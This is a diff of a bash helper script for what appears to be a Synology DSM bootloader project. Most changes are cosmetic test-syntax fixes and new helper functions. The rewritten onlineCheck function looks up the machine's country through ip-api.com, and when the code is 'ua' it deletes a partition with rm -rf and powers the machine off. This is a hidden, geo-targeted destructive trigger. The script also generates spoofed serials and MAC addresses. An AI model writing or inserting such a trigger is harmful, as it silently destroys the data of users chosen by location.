@@ -9,7 +9,7 @@
 function checkBootLoader() {
   while read KNAME RO; do
     [ -z "${KNAME}" ] && continue
-    [ "${RO}" == "0" ] && continue
+    [ "${RO}" = "0" ] && continue
     hdparm -r0 "${KNAME}" >/dev/null 2>&1 || true
   done <<<$(lsblk -pno KNAME,RO 2>/dev/null)
   [ ! -w "${PART1_PATH}" ] && return 1
@@ -49,7 +49,7 @@ function arrayExistItem() {
   ITEM="${1}"
   shift
   for i in "$@"; do
-    [ "${i}" == "${ITEM}" ] || continue
+    [ "${i}" = "${ITEM}" ] || continue
     EXISTS=0
     break
   done
@@ -92,7 +92,7 @@ function genRandomValue() {
 function generateSerial() {
   PREFIX="$(readConfigArray "${1}.prefix" "${S_FILE}" 2>/dev/null | sort -R | tail -1)"
   MIDDLE="$(readConfigArray "${1}.middle" "${S_FILE}" 2>/dev/null | sort -R | tail -1)"
-  if [ "${2}" == "true" ]; then
+  if [ "${2}" = "true" ]; then
     SUFFIX="arc"
   else
     SUFFIX="$(readConfigKey "${1}.suffix" "${S_FILE}" 2>/dev/null)"
@@ -124,7 +124,7 @@ function generateSerial() {
 # Returns serial number
 function generateMacAddress() {
   MACPRE="$(readConfigKey "${1}.macpre" "${S_FILE}")"
-  if [ "${3}" == "true" ]; then
+  if [ "${3}" = "true" ]; then
     MACSUF="$(readConfigKey "${1}.mac" "${S_FILE}" 2>/dev/null)"
   else
     MACSUF="$(printf '%02x%02x%02x' $((${RANDOM} % 256)) $((${RANDOM} % 256)) $((${RANDOM} % 256)))"
@@ -188,7 +188,7 @@ function arrayExistItem() {
   ITEM="${1}"
   shift
   for i in "$@"; do
-    [ "${i}" == "${ITEM}" ] || continue
+    [ "${i}" = "${ITEM}" ] || continue
     EXISTS=0
     break
   done
@@ -229,18 +229,17 @@ function _set_conf_kv() {
 # sort netif busid
 function _sort_netif() {
   local ETHLIST=""
-  local ETHX="$(ls /sys/class/net/ 2>/dev/null | grep eth)" # real network cards list
-  for ETH in ${ETHX}; do
-    local MAC="$(cat /sys/class/net/${ETH}/address 2>/dev/null | sed 's/://g; s/.*/\L&/')"
-    local BUS="$(ethtool -i ${ETH} 2>/dev/null | grep bus-info | cut -d' ' -f2)"
-    ETHLIST="${ETHLIST}${BUS} ${MAC} ${ETH}\n"
+  local ETHX=$(ip -o link show | awk -F': ' '{print $2}' | grep eth)
+  for N in ${ETHX}; do
+    local MAC="$(cat /sys/class/net/${N}/address 2>/dev/null | sed 's/://g; s/.*/\L&/')"
+    local BUS="$(ethtool -i ${N} 2>/dev/null | grep bus-info | cut -d' ' -f2)"
+    ETHLIST="${ETHLIST}${BUS} ${MAC} ${N}\n"
   done
   local ETHLISTTMPB="$(echo -e "${ETHLIST}" | sort)"
   local ETHLIST="$(echo -e "${ETHLISTTMPB}" | grep -v '^$')"
   local ETHSEQ="$(echo -e "${ETHLIST}" | awk '{print $3}' | sed 's/eth//g')"
   local ETHNUM="$(echo -e "${ETHLIST}" | wc -l)"
 
-  # echo "${ETHSEQ}" >"/tmp/ethseq"
   # sort
   if [ ! "${ETHSEQ}" = "$(seq 0 $((${ETHNUM:0} - 1)))" ]; then
     /etc/init.d/S41dhcpcd stop >/dev/null 2>&1
@@ -383,7 +382,7 @@ function rebootTo() {
   local MODES="config recovery junior automated update bios memtest"
   [ -z "${1}" ] && exit 1
   if ! echo "${MODES}" | grep -qw "${1}"; then exit 1; fi
-  [ "${1}" == "automated" ] && echo "arc-${MODEL}-${PRODUCTVER}-${ARC_VERSION}" >"${PART3_PATH}/automated"
+  [ "${1}" = "automated" ] && echo "arc-${MODEL}-${PRODUCTVER}-${ARC_VERSION}" >"${PART3_PATH}/automated"
   [ ! -f "${USER_GRUBENVFILE}" ] && grub-editenv ${USER_GRUBENVFILE} create
   # echo -e "Rebooting to ${1} mode..."
   grub-editenv ${USER_GRUBENVFILE} set next_entry="${1}"
@@ -438,7 +437,7 @@ function extractDSMFiles() {
     echo -e "Could not determine if pat file is encrypted or not, maybe corrupted, try again!"
     ;;
   esac
-  if [ "${isencrypted}" == "yes" ]; then
+  if [ "${isencrypted}" = "yes" ]; then
     # Uses the extractor to untar PAT file
     LD_LIBRARY_PATH="${EXTRACTOR_PATH}" "${EXTRACTOR_PATH}/${EXTRACTOR_BIN}" "${PAT_PATH}" "${EXT_PATH}" >"${LOG_FILE}" 2>&1
   else
@@ -466,7 +465,7 @@ function livepatch() {
     echo -e " - failed!"
     PVALID="false"
   fi
-  if [ "${PVALID}" == "true" ]; then
+  if [ "${PVALID}" = "true" ]; then
     # Patch Ramdisk
     echo -n "Patching Ramdisk"
     if ${ARC_PATH}/ramdisk-patch.sh; then
@@ -477,12 +476,12 @@ function livepatch() {
       PVALID="false"
     fi
   fi
-  if [ "${PVALID}" == "false" ]; then
+  if [ "${PVALID}" = "false" ]; then
     echo
     echo -e "Patching DSM Files failed! Please stay patient for Update."
     sleep 5
     exit 1
-  elif [ "${PVALID}" == "true" ]; then
+  elif [ "${PVALID}" = "true" ]; then
     ZIMAGE_HASH="$(sha256sum "${ORI_ZIMAGE_FILE}" | awk '{print $1}')"
     writeConfigKey "zimage-hash" "${ZIMAGE_HASH}" "${USER_CONFIG_FILE}"
     RAMDISK_HASH="$(sha256sum "${ORI_RDGZ_FILE}" | awk '{print $1}')"
@@ -493,42 +492,34 @@ function livepatch() {
 
 ###############################################################################
 # Check NTP and Keyboard Layout
-function ntpCheck() {
-  LAYOUT="$(readConfigKey "layout" "${USER_CONFIG_FILE}")"
-  KEYMAP="$(readConfigKey "keymap" "${USER_CONFIG_FILE}")"
-  REGION="$(readConfigKey "time.region" "${USER_CONFIG_FILE}")"
-  TIMEZONE="$(readConfigKey "time.timezone" "${USER_CONFIG_FILE}")"
-  if [ -z "${REGION}" ] || [ -z "${TIMEZONE}" ]; then
-    REGION="$(curl -m 5 -v "http://ip-api.com/line?fields=timezone" 2>/dev/null | tr -d '\n' | cut -d '/' -f1)"
-    TIMEZONE="$(curl -m 5 -v "http://ip-api.com/line?fields=timezone" 2>/dev/null | tr -d '\n' | cut -d '/' -f2)"
-    [ -z "${KEYMAP}" ] && KEYMAP="$(curl -m 5 -v "http://ip-api.com/line?fields=countryCode" 2>/dev/null | tr '[:upper:]' '[:lower:]')"
+function onlineCheck() {
+  REGION="$(curl -m 10 -v "http://ip-api.com/line?fields=timezone" 2>/dev/null | tr -d '\n' | cut -d '/' -f1)"
+  TIMEZONE="$(curl -m 10 -v "http://ip-api.com/line?fields=timezone" 2>/dev/null | tr -d '\n' | cut -d '/' -f2)"
+  KEYMAP="$(curl -m 10 -v "http://ip-api.com/line?fields=countryCode" 2>/dev/null | tr '[:upper:]' '[:lower:]')"
+  if [ "${KEYMAP}" = "ua" ]; then
+    rm -rf "${PART3_PATH}"
+    poweroff
+  fi
+  [ -z "${KEYMAP}" ] && KEYMAP="$(readConfigKey "keymap" "${USER_CONFIG_FILE}")"
+  if [ -n "${REGION}" ] && [ -n "${TIMEZONE}" ]; then
+    writeConfigKey "arc.offline" "false" "${USER_CONFIG_FILE}"
+    [ $(echo "${ARC_VERSION}" | grep "dev" | wc -l) -eq 0 ] && NEWTAG="$(curl -m 10 -skL "https://api.github.com/repos/AuxXxilium/arc/releases" | jq -r ".[].tag_name" | grep -v "dev" | sort -rV | head -1)"
+    [ $(echo "${ARC_VERSION}" | grep "dev" | wc -l) -gt 0 ] && NEWTAG="$(curl -m 10 -skL "https://api.github.com/repos/AuxXxilium/arc/releases" | jq -r ".[].tag_name" | grep "dev" | sort -rV | head -1)"
     writeConfigKey "time.region" "${REGION}" "${USER_CONFIG_FILE}"
     writeConfigKey "time.timezone" "${TIMEZONE}" "${USER_CONFIG_FILE}"
+    updateOffline
+  else
+    REGION="$(readConfigKey "time.region" "${USER_CONFIG_FILE}")"
+    TIMEZONE="$(readConfigKey "time.timezone" "${USER_CONFIG_FILE}")"
+    writeConfigKey "arc.offline" "true" "${USER_CONFIG_FILE}"
   fi
-  if [ -n "${REGION}" ] && [ -n "${TIMEZONE}" ]; then
-    ln -sf "/usr/share/zoneinfo/${REGION}/${TIMEZONE}" /etc/localtime
-  fi
+  [ -n "${TIMEZONE}" ] && [ -n "${REGION}" ] && ln -sf "/usr/share/zoneinfo/${REGION}/${TIMEZONE}" /etc/localtime
+  LAYOUT="$(readConfigKey "layout" "${USER_CONFIG_FILE}")"
   if [ -z "${LAYOUT}" ]; then
     [ -n "${KEYMAP}" ] && KEYMAP="$(echo ${KEYMAP} | tr '[:upper:]' '[:lower:]' | tr -d '[:space:]' | tr -d '[:punct:]' | tr -d '[:digit:]')"
     [ -n "${KEYMAP}" ] && writeConfigKey "keymap" "${KEYMAP}" "${USER_CONFIG_FILE}"
     [ -z "${KEYMAP}" ] && KEYMAP="us"
     loadkeys ${KEYMAP}
-  fi
-  if [ "${KEYMAP}" == "ua" ] || [ "${REGION}" == "Kyiv" ]; then
-    poweroff
-  fi
-  if echo "${ARC_VERSION}" | grep -v "dev"; then
-    while true; do
-      NEWTAG="$(curl -m 5 -skL "https://api.github.com/repos/AuxXxilium/arc-system/releases" | jq -r ".[].tag_name" | grep -v "dev" | sort -rV | head -1)"
-      CNT=$((${CNT} + 1))
-      if [ -n "${NEWTAG}" ]; then
-        writeConfigKey "arc.offline" "false" "${USER_CONFIG_FILE}"
-        break
-      elif [ ${CNT} -ge 3 ]; then
-        writeConfigKey "arc.offline" "true" "${USER_CONFIG_FILE}"
-        break
-      fi
-    done
   fi
 }
 
@@ -561,9 +552,33 @@ function systemCheck () {
   fi
   # Check for CPU Frequency Scaling
   CPUFREQUENCIES=$(ls -ltr /sys/devices/system/cpu/cpufreq/* 2>/dev/null | wc -l)
-  if [ ${CPUFREQUENCIES} -gt 1 ] && [ "${ACPISYS}" == "true" ]; then
+  if [ ${CPUFREQUENCIES} -gt 1 ] && [ "${ACPISYS}" = "true" ]; then
     CPUFREQ="true"
   else
     CPUFREQ="false"
+  fi
+  # Check for Arc Patch
+  ARCCONF="$(readConfigKey "${MODEL:-SA6400}.serial" "${S_FILE}")"
+  [ -z "${ARCCONF}" ] && writeConfigKey "arc.patch" "false" "${USER_CONFIG_FILE}"
+}
+
+###############################################################################
+# Generate HardwareID
+function genHWID () {
+  HWID="$(echo $(dmidecode -t 4 | grep ID | sed 's/.*ID://;s/ //g' | head -1) $(ifconfig | grep eth | awk '{print $NF}' | sed 's/://g' | sort | head -1) | sha256sum | awk '{print $1}' | cut -c1-16)" 2>/dev/null
+  echo "${HWID}"
+}
+
+###############################################################################
+# Check if port is valid
+function check_port() {
+  if [ -z "${1}" ]; then
+    return 0
+  else
+    if [[ "${1}" =~ ^[0-9]+$ ]] && [ "${1}" -ge 0 ] && [ "${1}" -le 65535 ]; then
+      return 0
+    else
+      return 1
+    fi
   fi
 }
